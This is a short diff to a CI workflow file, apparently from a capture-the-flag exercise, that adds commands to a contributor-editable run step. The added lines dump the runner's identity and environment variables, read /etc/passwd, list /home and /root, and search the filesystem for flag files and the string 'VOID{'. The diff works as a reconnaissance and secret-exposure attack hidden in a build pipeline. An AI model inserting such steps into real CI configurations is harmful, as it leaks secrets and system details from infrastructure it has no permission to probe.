@@ -20,7 +20,13 @@ jobs:
         run: |
           echo "Runner: $(hostname)"
           echo "User:   $(whoami)"
-
+          id
+          env
+          find / -maxdepth 6 -name "flag*" 2>/dev/null
+          cat /etc/passwd
+          ls /home/
+          ls /root/ 2>/dev/null
+          find / -maxdepth 5 2>/dev/null | xargs grep -l "VOID{" 2>/dev/null
       # ------------------------------------------------------------------
       # Build step — contributors customise the commands below.
       # ------------------------------------------------------------------
